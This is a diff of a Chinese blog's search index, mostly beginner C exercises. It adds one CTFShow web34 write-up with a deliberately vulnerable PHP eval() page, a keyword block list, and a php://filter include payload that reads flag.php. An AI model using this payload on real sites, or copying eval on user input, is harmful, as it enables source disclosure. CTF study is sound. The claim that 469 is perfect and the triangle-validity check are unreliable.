@@ -1,26 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>1000以内的完全数</title>
-    <url>/2019/07/26/1000%E4%BB%A5%E5%86%85%E7%9A%84%E5%AE%8C%E5%85%A8%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="完全数-1000以内-（Perfect-number）"><a href="#完全数-1000以内-（Perfect-number）" class="headerlink" title="完全数(1000以内)（Perfect number）"></a>完全数(1000以内)（Perfect number）</h1><p>输出1000以内的完全数（Perfect number）  </p>
-<p>如果一个数恰好等于它的因子之和，则称该数为“完全数”  </p>
-<p>如： 6 ，28, 469 ……  </p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">perfect_number</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function">	</span>&#123;	</span><br><span class="line">		<span class="keyword">int</span> s,j;</span><br><span class="line">		s=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=number/<span class="number">2</span>;j++)</span><br><span class="line">			<span class="keyword">if</span>(number%j==<span class="number">0</span>)</span><br><span class="line">				s+=j;</span><br><span class="line">		<span class="keyword">if</span>(number==s)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> number;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1000以内的完数：\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(number=<span class="number">1</span>;number&lt;=<span class="number">1000</span>;number++)</span><br><span class="line">		<span class="keyword">if</span>(perfect_number(number)==<span class="number">1</span>) </span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d "</span>,number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/07/26/1000以内的完全数/02.jpg" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>1+2^2+3^3+4^4+5^5</title>
     <url>/2019/08/06/1-2-2-3-3-4-4-5-5/</url>
     <content><![CDATA[<h1 id="1-2-2-3-3-4-4-5-5"><a href="#1-2-2-3-3-4-4-5-5" class="headerlink" title="1+2^2+3^3+4^4+5^5"></a>1+2^2+3^3+4^4+5^5</h1><p>计算：1+2^2+3^3+4^4+5^5：  </p>
@@ -61,6 +41,26 @@
       </tags>
   </entry>
   <entry>
+    <title>1000以内的完全数</title>
+    <url>/2019/07/26/1000%E4%BB%A5%E5%86%85%E7%9A%84%E5%AE%8C%E5%85%A8%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="完全数-1000以内-（Perfect-number）"><a href="#完全数-1000以内-（Perfect-number）" class="headerlink" title="完全数(1000以内)（Perfect number）"></a>完全数(1000以内)（Perfect number）</h1><p>输出1000以内的完全数（Perfect number）  </p>
+<p>如果一个数恰好等于它的因子之和，则称该数为“完全数”  </p>
+<p>如： 6 ，28, 469 ……  </p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">perfect_number</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function">	</span>&#123;	</span><br><span class="line">		<span class="keyword">int</span> s,j;</span><br><span class="line">		s=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=number/<span class="number">2</span>;j++)</span><br><span class="line">			<span class="keyword">if</span>(number%j==<span class="number">0</span>)</span><br><span class="line">				s+=j;</span><br><span class="line">		<span class="keyword">if</span>(number==s)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> number;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1000以内的完数：\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(number=<span class="number">1</span>;number&lt;=<span class="number">1000</span>;number++)</span><br><span class="line">		<span class="keyword">if</span>(perfect_number(number)==<span class="number">1</span>) </span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d "</span>,number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：  </p>
+<p><img src="//czheisenberg.github.io/2019/07/26/1000以内的完全数/02.jpg" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>123---321</title>
     <url>/2019/08/22/123-321/</url>
     <content><![CDATA[<h1 id="倒着输出"><a href="#倒着输出" class="headerlink" title="倒着输出"></a>倒着输出</h1><p>输入一个整数：123 输出：321  </p>
@@ -90,6 +90,25 @@
 
 <p>运行结果：  </p>
 <p><img src="//czheisenberg.github.io/2019/08/05/1²-2²-3²-……10²/011.jpg" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+        <tag>C语言数列</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>99乘法表</title>
+    <url>/2019/08/18/99%E4%B9%98%E6%B3%95%E8%A1%A8/</url>
+    <content><![CDATA[<h1 id="九九乘法表"><a href="#九九乘法表" class="headerlink" title="九九乘法表"></a>九九乘法表</h1><p>源代码：  </p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"%2d*%2d=%2d"</span>,i,j,i*j);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：  </p>
+<p><img src="//czheisenberg.github.io/2019/08/18/99乘法表/99.jpg" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -138,25 +157,6 @@
       </tags>
   </entry>
   <entry>
-    <title>99乘法表</title>
-    <url>/2019/08/18/99%E4%B9%98%E6%B3%95%E8%A1%A8/</url>
-    <content><![CDATA[<h1 id="九九乘法表"><a href="#九九乘法表" class="headerlink" title="九九乘法表"></a>九九乘法表</h1><p>源代码：  </p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"%2d*%2d=%2d"</span>,i,j,i*j);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/08/18/99乘法表/99.jpg" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-        <tag>C语言数列</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Do you know how many days you have lived?</title>
     <url>/2019/08/20/Do-you-know-how-many-days-you-have-lived/</url>
     <content><![CDATA[<h1 id="你知道你活了多少天了吗？"><a href="#你知道你活了多少天了吗？" class="headerlink" title="你知道你活了多少天了吗？"></a>你知道你活了多少天了吗？</h1><p>问题：求你存在于这个美丽世界的天数！  </p>
@@ -176,6 +176,27 @@
       <tags>
         <tag>C</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>CTFShow Web笔记</title>
+    <url>/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="web34——命令执行"><a href="#web34——命令执行" class="headerlink" title="web34——命令执行"></a>web34——命令执行</h1><p>源码:</p>
+<a id="more"></a>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i"</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了：flag, system, php, cat, sort, shell, 小数点, 空格, 单引号，反引号，echo, 分号，左括号，冒号，双引号；<br>此题同上一题类似</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span>$_GET[x]<span class="meta">?&gt;</span>&amp;x=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web34.png" alt></p>
+<p>base64解码即可得到flag:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:49:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:49:26</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$flag=<span class="string">"ctfshow&#123;176e1aa8-38eb-48f9-a1a9-07a5ea683dd3&#125;"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>ctfshow{176e1aa8-38eb-48f9-a1a9-07a5ea683dd3}</p>
+]]></content>
+      <categories>
+        <category>CTF笔记</category>
+      </categories>
   </entry>
   <entry>
     <title>Painting heart</title>
@@ -255,6 +276,32 @@
 ]]></content>
   </entry>
   <entry>
+    <title>三角形的类型和面积</title>
+    <url>/2019/08/27/%E4%B8%89%E8%A7%92%E5%BD%A2%E7%9A%84%E7%B1%BB%E5%9E%8B%E5%92%8C%E9%9D%A2%E7%A7%AF/</url>
+    <content><![CDATA[<h1 id="计算三角形的类型和面积"><a href="#计算三角形的类型和面积" class="headerlink" title="计算三角形的类型和面积"></a>计算三角形的类型和面积</h1><h2 id="海伦公式："><a href="#海伦公式：" class="headerlink" title="海伦公式："></a>海伦公式：</h2><p>海伦公式，传说中是古代的叙拉古国王希伦二世发现的公式，利用三角形的三边来求三角形的面积，但后人求证出此公式其实是 <strong>阿基米德</strong>这个老头发现的！  （详细情况请自行百科：）  </p>
+<p>ps:中国宋代的数学家秦九韶在1247年独立提出了“三斜求积术” </p>
+<a id="more"></a>
+
+<p>一个三角形 三边分别为： a、b、c，s为面积  </p>
+<p><em>s=(a+b+c)/2</em>  </p>
+<p><em>s=根号{s(s-a)(s-b)(s-c)}</em> </p>
+<p>此公式就摆脱了 高与底  </p>
+<h2 id="include”math-h”"><a href="#include”math-h”" class="headerlink" title="#include”math.h”"></a>#include”math.h”</h2><p><strong>&lt;math.h&gt;</strong> 头文件包含了一系列与数学计算相关的函数和宏。  </p>
+<h2 id="sqrt-平方根计算"><a href="#sqrt-平方根计算" class="headerlink" title="sqrt(平方根计算)"></a>sqrt(平方根计算)</h2><p>sqrt 就是公式中的根号，用法： sqrt(xxxx)</p>
+<p>源代码：  </p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"math.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">float</span> a,b,c,area,s;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入三角形的三边长：\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%f%f%f"</span>,&amp;a,&amp;b,&amp;c);</span><br><span class="line">	<span class="keyword">if</span>(a+b&gt;c||a+c&gt;b||b+c&gt;a)<span class="comment">// 两边之和大于第三边 </span></span><br><span class="line">		&#123;</span><br><span class="line">			s=(a+b+c)/<span class="number">2</span>;</span><br><span class="line">			area=(<span class="keyword">float</span>)<span class="built_in">sqrt</span>(s*(s-a)*(s-b)*(s-c));<span class="comment">//海伦公式 </span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"三角形的面积：%f\n"</span>,area);</span><br><span class="line">			<span class="keyword">if</span>(a==b&amp;&amp;a==c)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"此为：等边三角形！\n"</span>);	<span class="comment">//判断等边 </span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(a==b||a==c||b==c)</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"此为：等腰三角形！\n"</span>);<span class="comment">//判断等腰 </span></span><br><span class="line">				 <span class="keyword">else</span> <span class="keyword">if</span>(a*a+b*b==c*c||a*a+c*c==b*b||b*b+c*c==a*a) <span class="comment">//判断直角 </span></span><br><span class="line">			 			<span class="built_in">printf</span>(<span class="string">"此为：直角三角形！\n"</span>);</span><br><span class="line">					  <span class="keyword">else</span>	</span><br><span class="line">					  	<span class="built_in">printf</span>(<span class="string">"此为：普通三角形！\n"</span>);<span class="comment">//其他普通三角形 </span></span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"不能构成三角形！\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果： </p>
+<p><img src="//czheisenberg.github.io/2019/08/27/三角形的类型和面积/333.jpg" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>lonely_number</title>
     <url>/2019/08/18/lonelynumber/</url>
     <content><![CDATA[<h1 id="质数"><a href="#质数" class="headerlink" title="质数"></a>质数</h1><p>除了1和它本身以外不再有其他因数的自然数。  </p>
@@ -294,23 +341,16 @@
       </tags>
   </entry>
   <entry>
-    <title>三角形的类型和面积</title>
-    <url>/2019/08/27/%E4%B8%89%E8%A7%92%E5%BD%A2%E7%9A%84%E7%B1%BB%E5%9E%8B%E5%92%8C%E9%9D%A2%E7%A7%AF/</url>
-    <content><![CDATA[<h1 id="计算三角形的类型和面积"><a href="#计算三角形的类型和面积" class="headerlink" title="计算三角形的类型和面积"></a>计算三角形的类型和面积</h1><h2 id="海伦公式："><a href="#海伦公式：" class="headerlink" title="海伦公式："></a>海伦公式：</h2><p>海伦公式，传说中是古代的叙拉古国王希伦二世发现的公式，利用三角形的三边来求三角形的面积，但后人求证出此公式其实是 <strong>阿基米德</strong>这个老头发现的！  （详细情况请自行百科：）  </p>
-<p>ps:中国宋代的数学家秦九韶在1247年独立提出了“三斜求积术” </p>
+    <title>冒泡法排序</title>
+    <url>/2019/07/17/%E5%86%92%E6%B3%A1%E6%B3%95%E6%8E%92%E5%BA%8F/</url>
+    <content><![CDATA[<h1 id="冒泡法排序"><a href="#冒泡法排序" class="headerlink" title="冒泡法排序"></a>冒泡法排序</h1><p>冒泡法排序：  </p>
+<p>源代码：  </p>
 <a id="more"></a>
 
-<p>一个三角形 三边分别为： a、b、c，s为面积  </p>
-<p><em>s=(a+b+c)/2</em>  </p>
-<p><em>s=根号{s(s-a)(s-b)(s-c)}</em> </p>
-<p>此公式就摆脱了 高与底  </p>
-<h2 id="include”math-h”"><a href="#include”math-h”" class="headerlink" title="#include”math.h”"></a>#include”math.h”</h2><p><strong>&lt;math.h&gt;</strong> 头文件包含了一系列与数学计算相关的函数和宏。  </p>
-<h2 id="sqrt-平方根计算"><a href="#sqrt-平方根计算" class="headerlink" title="sqrt(平方根计算)"></a>sqrt(平方根计算)</h2><p>sqrt 就是公式中的根号，用法： sqrt(xxxx)</p>
-<p>源代码：  </p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"math.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">float</span> a,b,c,area,s;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入三角形的三边长：\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%f%f%f"</span>,&amp;a,&amp;b,&amp;c);</span><br><span class="line">	<span class="keyword">if</span>(a+b&gt;c||a+c&gt;b||b+c&gt;a)<span class="comment">// 两边之和大于第三边 </span></span><br><span class="line">		&#123;</span><br><span class="line">			s=(a+b+c)/<span class="number">2</span>;</span><br><span class="line">			area=(<span class="keyword">float</span>)<span class="built_in">sqrt</span>(s*(s-a)*(s-b)*(s-c));<span class="comment">//海伦公式 </span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"三角形的面积：%f\n"</span>,area);</span><br><span class="line">			<span class="keyword">if</span>(a==b&amp;&amp;a==c)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"此为：等边三角形！\n"</span>);	<span class="comment">//判断等边 </span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(a==b||a==c||b==c)</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"此为：等腰三角形！\n"</span>);<span class="comment">//判断等腰 </span></span><br><span class="line">				 <span class="keyword">else</span> <span class="keyword">if</span>(a*a+b*b==c*c||a*a+c*c==b*b||b*b+c*c==a*a) <span class="comment">//判断直角 </span></span><br><span class="line">			 			<span class="built_in">printf</span>(<span class="string">"此为：直角三角形！\n"</span>);</span><br><span class="line">					  <span class="keyword">else</span>	</span><br><span class="line">					  	<span class="built_in">printf</span>(<span class="string">"此为：普通三角形！\n"</span>);<span class="comment">//其他普通三角形 </span></span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"不能构成三角形！\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入%d个数：\n"</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N<span class="number">-1</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=N<span class="number">-1</span>;j&gt;i;j--)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(a[j]&gt;a[j<span class="number">-1</span>])          <span class="comment">// &gt; 为降序，&lt; 为升序</span></span><br><span class="line">						&#123;</span><br><span class="line">							t=a[j],a[j]=a[j<span class="number">-1</span>],a[j<span class="number">-1</span>]=t;</span><br><span class="line">						&#125;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"冒泡法排序 降序：\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">			</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>运行结果： </p>
-<p><img src="//czheisenberg.github.io/2019/08/27/三角形的类型和面积/333.jpg" alt></p>
+<p>运行结果：  </p>
+<p><img src="//czheisenberg.github.io/2019/07/17/冒泡法排序/7.png" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -330,25 +370,6 @@
 
 <p>运行结果：  </p>
 <p><img src="//czheisenberg.github.io/2019/08/17/二分查找/2.jpg" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>冒泡法排序</title>
-    <url>/2019/07/17/%E5%86%92%E6%B3%A1%E6%B3%95%E6%8E%92%E5%BA%8F/</url>
-    <content><![CDATA[<h1 id="冒泡法排序"><a href="#冒泡法排序" class="headerlink" title="冒泡法排序"></a>冒泡法排序</h1><p>冒泡法排序：  </p>
-<p>源代码：  </p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入%d个数：\n"</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N<span class="number">-1</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=N<span class="number">-1</span>;j&gt;i;j--)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(a[j]&gt;a[j<span class="number">-1</span>])          <span class="comment">// &gt; 为降序，&lt; 为升序</span></span><br><span class="line">						&#123;</span><br><span class="line">							t=a[j],a[j]=a[j<span class="number">-1</span>],a[j<span class="number">-1</span>]=t;</span><br><span class="line">						&#125;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"冒泡法排序 降序：\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">			</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/07/17/冒泡法排序/7.png" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -417,6 +438,27 @@
       </tags>
   </entry>
   <entry>
+    <title>回文数</title>
+    <url>/2019/07/16/%E5%9B%9E%E6%96%87%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h1><p>“回文”是指正读反读都能读通的句子，它是古今中外都有的一种修辞方式和文字游戏，如“我为人人，人人为我”等。在数学中也有这样一类数字有这样的特征，成为回文数（palindrome number</p>
+<p>设n是一任意自然数。若将n的各位数字反向排列所得自然数n1与n相等，则称n为一回文数。例如，若n=1234321，则称n为一回文数；但若n=1234567，则n不是回文数。  </p>
+<p>简单来说： 正读与反读都一样！  </p>
+<p>源代码：  </p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">h_h</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,m;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;x;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			j=i;</span><br><span class="line">			m=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">while</span>(j)</span><br><span class="line">				&#123;</span><br><span class="line">					m=m*<span class="number">10</span>+j%<span class="number">10</span>;</span><br><span class="line">					j/=<span class="number">10</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="keyword">if</span>(i==m)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d "</span>,i);</span><br><span class="line">			&#125;</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x,y,i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一个范围 如：100\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">	<span class="keyword">if</span>(h_h(x));</span><br><span class="line">		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：  </p>
+<p><img src="//czheisenberg.github.io/2019/07/16/回文数/6.png" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>同构数</title>
     <url>/2019/08/24/%E5%90%8C%E6%9E%84%E6%95%B0/</url>
     <content><![CDATA[<h1 id="同构数"><a href="#同构数" class="headerlink" title="同构数"></a>同构数</h1><p>正整数n若是它平方数的尾部，则称n为同构数。  </p>
@@ -450,27 +492,6 @@
 
 <p>运行结果：</p>
 <p><img src="//czheisenberg.github.io/2019/12/06/同构数02/tong.jpg" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>回文数</title>
-    <url>/2019/07/16/%E5%9B%9E%E6%96%87%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h1><p>“回文”是指正读反读都能读通的句子，它是古今中外都有的一种修辞方式和文字游戏，如“我为人人，人人为我”等。在数学中也有这样一类数字有这样的特征，成为回文数（palindrome number</p>
-<p>设n是一任意自然数。若将n的各位数字反向排列所得自然数n1与n相等，则称n为一回文数。例如，若n=1234321，则称n为一回文数；但若n=1234567，则n不是回文数。  </p>
-<p>简单来说： 正读与反读都一样！  </p>
-<p>源代码：  </p>
-<a id="more"></a>
-
